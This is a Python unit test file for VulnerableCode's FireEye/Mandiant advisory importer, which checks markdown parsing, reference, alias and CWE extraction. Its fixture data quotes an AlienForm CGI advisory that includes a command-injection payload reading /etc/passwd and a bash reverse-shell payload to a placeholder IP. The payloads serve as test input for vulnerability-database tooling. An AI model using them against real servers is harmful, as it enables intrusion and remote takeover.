#
# Copyright (c) nexB Inc. and others. All rights reserved.
# VulnerableCode is a trademark of nexB Inc.
# SPDX-License-Identifier: Apache-2.0
# See http://www.apache.org/licenses/LICENSE-2.0 for the license text.
# See https://github.com/aboutcode-org/vulnerablecode for support or download.
# See https://aboutcode.org for more information about nexB OSS projects.
#
import os
from pathlib import Path
from unittest import TestCase

from vulnerabilities.importer import Reference
from vulnerabilities.importers.fireeye import get_aliases
from vulnerabilities.importers.fireeye import get_references
from vulnerabilities.importers.fireeye import get_weaknesses
from vulnerabilities.importers.fireeye import md_list_to_dict
from vulnerabilities.importers.fireeye import parse_advisory_data
from vulnerabilities.tests import util_tests

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEST_DATA = os.path.join(BASE_DIR, "test_data/fireeye")


class TestFireeyeImporter(TestCase):
    def test_md_list_to_dict(self):
        md_list = [
            "# FEYE-2020-0004",
            "## Description",
            "AlienForm v2.0.2 CGI script is vulnerable to remote code execution leading to server compromise by attackers. This vulnerability could be a derivative or unexplored area of CVE-2002-0934.",
            "## Impact",
            "High - Successful exploitation of this vulnerability results in the attacker remotely executing code on the affected systems. Remote code execution could lead to complete system compromise and the ability to gain access to user credentials and/or move laterally throughout the compromised environment.",
            "## Exploitability",
            "High - An attacker needs only to identify the affected CGI script is present on the server; a simple directory brute force can reveal the presence of the vulnerable CGI file.",
            "## CVE Reference",
            "CVE-2020-10948",
            "## Technical Details",
            "Mandiant discovered the affected server is vulnerable to command injection in CGI argument parameters",
            "Affected URL:",
            "http://<affected host>//cgibin/af2.cgi",
            "Example attack payload:",
            "POST //cgibin/af2.cgi HTTP/1.1 <br>",
            "Host: <affected host> <br>",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 <br>",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 <br>",
            "Accept-Language: en-US,en;q=0.5 <br>",
            "Accept-Encoding: gzip, deflate <br>",
            "Connection: close <br>",
            "Upgrade-Insecure-Requests: 1 <br>",
            "Content-Length: 38 <br>",
            "_browser_out=%7Ccat%20/etc/passwd%7C",
            "Reverse Shell Example:",
            "_browser_out=%7Cbash+-i+>%26+/dev/tcp/<IP>/8080+0>%261%7C",
            "## Resolution",
            "Defunct software no longer support by vendor; not fixed.  FireEye Mandiant recommends disabling the affected CGI Script and to avoid using legacy CGI scripts in environments which do not have security support.",
            "## Discovery Credits",
            "Nikhith Tummalapalli, Mandiant FireEye",
            "## Disclosure Timeline",
            "- 19 Dec 2019: Attempted to email Jon Hedley, jon(at)cgi.tj, to report bug; email was bounced back",
            "- 19 Dec 2019: Searched for other contacts for Jon Hedley and Alienform via Linked-In and Twitter...no resulting contact information",
            "- 19 Dec 2019: Determined company was defunct and software is no longer maintained.  The primary search results online were related to CVE-2002-0934, to which this bug is related and/or induced by its fix.",
            "- 24 Mar 2020: Searched again online for new updates to AlienForm contact information; produced same results as previous.",
            "- 24 Mar 2020: Reserved CVE with Mitre after 90 days",
            "- 1 April 2020: Posted and notified Mitre of reference",
            "## References ",
            "- http://1-4a.com/cgi-bin/alienform/af.cgi",
            "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
            "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
        ]
        assert md_list_to_dict(md_list) == {
            "# FEYE-2020-0004": [],
            "## Description": [
                "AlienForm v2.0.2 CGI script is vulnerable to remote code execution leading to server compromise by attackers. This vulnerability could be a derivative or unexplored area of CVE-2002-0934."
            ],
            "## Impact": [
                "High - Successful exploitation of this vulnerability results in the attacker remotely executing code on the affected systems. Remote code execution could lead to complete system compromise and the ability to gain access to user credentials and/or move laterally throughout the compromised environment."
            ],
            "## Exploitability": [
                "High - An attacker needs only to identify the affected CGI script is present on the server; a simple directory brute force can reveal the presence of the vulnerable CGI file."
            ],
            "## CVE Reference": ["CVE-2020-10948"],
            "## Technical Details": [
                "Mandiant discovered the affected server is vulnerable to command injection in CGI argument parameters",
                "Affected URL:",
                "http://<affected host>//cgibin/af2.cgi",
                "Example attack payload:",
                "POST //cgibin/af2.cgi HTTP/1.1 <br>",
                "Host: <affected host> <br>",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 <br>",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 <br>",
                "Accept-Language: en-US,en;q=0.5 <br>",
                "Accept-Encoding: gzip, deflate <br>",
                "Connection: close <br>",
                "Upgrade-Insecure-Requests: 1 <br>",
                "Content-Length: 38 <br>",
                "_browser_out=%7Ccat%20/etc/passwd%7C",
                "Reverse Shell Example:",
                "_browser_out=%7Cbash+-i+>%26+/dev/tcp/<IP>/8080+0>%261%7C",
            ],
            "## Resolution": [
                "Defunct software no longer support by vendor; not fixed.  FireEye Mandiant recommends disabling the affected CGI Script and to avoid using legacy CGI scripts in environments which do not have security support."
            ],
            "## Discovery Credits": ["Nikhith Tummalapalli, Mandiant FireEye"],
            "## Disclosure Timeline": [
                "- 19 Dec 2019: Attempted to email Jon Hedley, jon(at)cgi.tj, to report bug; email was bounced back",
                "- 19 Dec 2019: Searched for other contacts for Jon Hedley and Alienform via Linked-In and Twitter...no resulting contact information",
                "- 19 Dec 2019: Determined company was defunct and software is no longer maintained.  The primary search results online were related to CVE-2002-0934, to which this bug is related and/or induced by its fix.",
                "- 24 Mar 2020: Searched again online for new updates to AlienForm contact information; produced same results as previous.",
                "- 24 Mar 2020: Reserved CVE with Mitre after 90 days",
                "- 1 April 2020: Posted and notified Mitre of reference",
            ],
            "## References ": [
                "- http://1-4a.com/cgi-bin/alienform/af.cgi",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
            ],
        }

    def test_get_ref(self):
        assert get_references(
            [
                "- http://1-4a.com/cgi-bin/alienform/af.cgi",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934",
                "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948",
            ]
        ) == [
            Reference(url="http://1-4a.com/cgi-bin/alienform/af.cgi"),
            Reference(url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934"),
            Reference(url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10948"),
        ]
        assert get_references(
            [
                "- [Mitre CVE-2021-42712](https://www.cve.org/CVERecord?id=CVE-2021-42712)",
            ]
        ) == [
            Reference(url="https://www.cve.org/CVERecord?id=CVE-2021-42712"),
        ]
        assert get_references(
            [
                "[Mitre CVE-2021-42712](https://www.cve.org/CVERecord?id=CVE-2021-42712)",
            ]
        ) == [
            Reference(url="https://www.cve.org/CVERecord?id=CVE-2021-42712"),
        ]
        assert get_references([]) == []

    def test_get_aliases(self):
        assert get_aliases("MNDT-2021-0012", ["CVE-2021-44207"]) == [
            "CVE-2021-44207",
            "MNDT-2021-0012",
        ]
        assert get_aliases("MNDT-2021-0012", []) == ["MNDT-2021-0012"]

    def test_parse_advisory_data_1(self):
        with open(os.path.join(TEST_DATA, "fireeye_test1.md")) as f:
            mock_response = f.read()
        expected_file = os.path.join(TEST_DATA, f"fireeye_test1_expect.json")

        imported_data = parse_advisory_data(
            mock_response, Path(expected_file), Path(expected_file).parent
        )
        result = imported_data.to_dict()

        util_tests.check_results_against_json(result, expected_file)

    def test_parse_advisory_data_2(self):
        with open(os.path.join(TEST_DATA, "fireeye_test2.md")) as f:
            mock_response = f.read()
        expected_file = os.path.join(TEST_DATA, f"fireeye_test2_expect.json")
        imported_data = parse_advisory_data(
            mock_response, Path(expected_file), Path(expected_file).parent
        )
        result = imported_data.to_dict()

        util_tests.check_results_against_json(result, expected_file)

    def test_md_list_to_dict_2(self):
        expected_output = {
            "# MNDT-2023-0017\n": [
                "\n",
                "The IBM Personal Communications (PCOMM) application 13.0.0 and earlier caused a user's plaintext password to be written to the `C:\\Temp\\pcsnp_init.log` file when re-connection was made through a remote desktop protocol.\n",
                "\n",
            ],
            "## Common Weakness Enumeration\n": [
                "CWE-312: Cleartext Storage of Sensitive Information\n",
                "\n",
            ],
            "## Impact\n": [
                "High - An attacker with low-privilege access to a host with IBM PCOMM could recover the plaintext password of another user.\n",
                "\n",
            ],
            "## Exploitability\n": [
                "Low - Exploitability varies depending on the environment in which IBM PCOMM is installed. Mandiant identified this vulnerability when conducting independent security research for a client that used Citrix to connect to shared Windows Server instances. In certain environments where remote desktop is used to connect to shared hosts with IBM PCOMM installed, the exploitability is greatly increased.\n",
                "\n",
            ],
            "## CVE Reference\n": ["CVE-2016-0321 - scope expanded\n", "\n"],
            "## Technical Details\n": [
                "While conducting independent security research, Mandiant identified a plaintext Active Directory password stored within the `C:\\Temp\\pcsnp_init.log` file. The affected host had IBM PCOMM version 13.0.0 installed and was used by multiple users who connected with Citrix. Upon a user connecting, disconnecting, and connecting again, the user's plaintext password was stored in the `C:\\Temp\\pcsnp_init.log` file.\n",
                "\n",
            ],
            "## Discovery Credits\n": [
                "- Adin Drabkin, Mandiant\n",
                "- Matthew Rotlevi, Mandiant\n",
                "\n",
            ],
            "## Disclosure Timeline\n": [
                "- 2023-09-26 - Issue reported to the vendor.\n",
                "- 2023-11-03 - The vendor updated the security bulletin for CVE-2016-0321 to include all known affected and fixed versions.\n",
                "\n",
            ],
            "## References\n": [
                "- [IBM Security Bulletin](https://www.ibm.com/support/pages/security-bulletin-ibm-personal-communications-could-allow-remote-user-obtain-sensitive-information-including-user-passwords-allowing-unauthorized-access-cve-2016-0321)\n",
                "- [IBM Personal Communications](https://www.ibm.com/support/pages/ibm-personal-communications)\n",
                "- [Mitre CVE-2016-0321](https://www.cve.org/CVERecord?id=CVE-2016-0321)\n",
            ],
        }
        with open(os.path.join(TEST_DATA, "fireeye_test3.md"), encoding="utf-8-sig") as f:
            md_list = f.readlines()
            md_dict = md_list_to_dict(md_list)
            assert md_dict == expected_output

    def test_get_weaknesses(self):
        assert get_weaknesses(
            [
                "CWE-379: Creation of Temporary File in Directory with Insecure Permissions",
                "CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')",
            ]
        ) == [379, 362]
        assert (
            get_weaknesses(
                [
                    "CWE-2345: This cwe id does not exist so it should generate Invalid CWE id error and return empty list."
                ]
            )
            == []
        )
